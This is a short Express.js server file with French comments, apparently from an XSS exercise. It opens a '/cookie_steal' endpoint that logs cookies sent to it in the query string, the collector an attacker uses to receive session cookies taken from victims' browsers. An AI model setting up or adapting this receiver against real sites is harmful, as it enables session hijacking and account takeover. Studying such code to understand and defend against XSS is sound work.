const express = require('express')
const bodyParser = require('body-parser')
const cors = require('cors')
const cookieParser = require('cookie-parser')

const app = express()
const urlencoder = bodyParser.urlencoded({extended:false})

app.use(cors())

app.use('/cookie_steal', urlencoder, cookieParser())

app.get('/cookie_steal', function(req,res){
    console.log(req.cookies)// > {} => On ne peut pas récupérer les cookies d'un autre site
    console.log('j\'ai volé le cookie : ' + req.query.cookie)
    res.send('Cookie reçu')
})

app.listen(3002)